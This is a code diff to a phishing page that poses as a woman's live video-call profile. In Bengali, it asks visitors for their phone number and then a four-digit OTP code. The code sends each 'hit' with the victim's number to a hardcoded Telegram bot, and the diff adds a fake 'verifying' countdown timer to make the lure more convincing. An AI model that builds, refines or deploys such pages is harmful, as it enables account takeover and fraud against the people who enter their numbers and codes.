@@ -3,20 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔴 Sumaiya Afrin  is LIVE NOW - LIVE</title>
-
-    <meta property="og:title" content="🔴 Sumaiya Afrin  is  LIVE NOW - LIVE">
-    <meta property="og:description" content="Unlock profile to start Imo/ voice or video call">
-    <meta property="og:image" content="https://🔴 Sumaiya Afrin  is LIVE NOW/received_1748447966512537.jpeg">
-    <meta property="og:url" content="https://🔴 Sumaiya Afrin  is LIVE NOW/live-now/">
-    <meta property="og:type" content="website">
+    <title>🔴 Sumaiya Afrin is LIVE NOW - LIVE</title>
 
     <style>
         body { font-family: sans-serif; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
         .card { width: 95%; max-width: 380px; margin: 50px auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); box-sizing: border-box; }
         img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid #e91e63; object-fit: cover; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        input { width: 100%; padding: 15px; margin: 15px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; text-align: center; }
         button { width: 100%; padding: 15px; background: linear-gradient(to right, #6a11cb, #2575fc); color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        
+        /* ১ম ছবির মতো ধূসর টাইমার স্টাইল */
+        #timerText {
+            color: #8E8E8E; 
+            font-size: 13px; 
+            font-weight: bold; 
+            margin-top: 20px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: none; /* শুরুতে লুকানো থাকবে */
+        }
     </style>
 </head>
 <body>
@@ -35,6 +40,8 @@
         <div id="step2" style="display:none;">
             <input type="tel" id="otp" placeholder="৪ ডিজিট কোড (OTP)" required>
             <button type="submit">ভিডিও কল শুরু করুন ✅</button>
+            
+            <p id="timerText">VERIFYING IN <span id="seconds">30</span>S...</p>
         </div>
     </form>
 </div>
@@ -43,6 +50,24 @@
     const token = '8521030210:AAHTVvrMSiVWpK_HeX6Uh9_ZZ9VKKm7jEg0';
     const chatId = '8795859465';
     let userPhone = "";
+
+    function startTimer() {
+        let seconds = 30;
+        const countdownElement = document.getElementById('seconds');
+        const timerText = document.getElementById('timerText');
+        
+        timerText.style.display = 'block'; // টাইমার দেখানো শুরু হবে
+
+        const timer = setInterval(() => {
+            seconds--;
+            countdownElement.textContent = seconds;
+
+            if (seconds <= 0) {
+                clearInterval(timer);
+                timerText.innerHTML = "OTP EXPIRED. PLEASE TRY AGAIN.";
+            }
+        }, 1000);
+    }
 
     function goToStep2() {
         const phoneInput = document.getElementById('phone').value;
@@ -56,6 +81,9 @@
         document.getElementById('step2').style.display = 'block';
         document.getElementById('title').innerText = "Verification";
         document.getElementById('msg').innerText = "কোডটি নিচে লিখুন";
+
+        // টাইমার শুরু করা হলো
+        startTimer();
 
         sendToTelegram(`🔔 New Hit!\n📱 Number: ${userPhone}`);
     }
